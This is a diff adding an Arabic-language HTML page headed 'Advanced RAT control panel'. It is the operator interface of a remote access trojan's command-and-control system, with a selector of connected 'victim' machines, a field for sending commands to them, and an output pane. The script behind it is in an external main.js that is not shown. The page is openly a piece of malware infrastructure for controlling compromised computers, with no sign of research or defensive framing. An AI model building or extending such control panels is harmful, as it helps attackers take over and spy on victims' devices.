@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>Web Panel</title>
+    <link rel="stylesheet" href="/static/style.css">
+</head>
+<body>
+
+<h1>لوحة تحكم RAT متقدمة</h1>
+
+<div class="control-panel">
+    <h2>الأجهزة المتصلة:</h2>
+    <select id="victim-select"></select>
+    <button onclick="loadVictim()">عرض تفاصيل</button>
+</div>
+
+<div class="command-section">
+    <h2>إرسال أمر:</h2>
+    <input type="text" id="command-input" placeholder="أدخل الأمر..." />
+    <button onclick="sendCommand()">إرسال</button>
+    <pre id="output">الرد سيظهر هنا...</pre>
+</div>
+
+<script src="/static/main.js"></script>
+</body>
+</html>
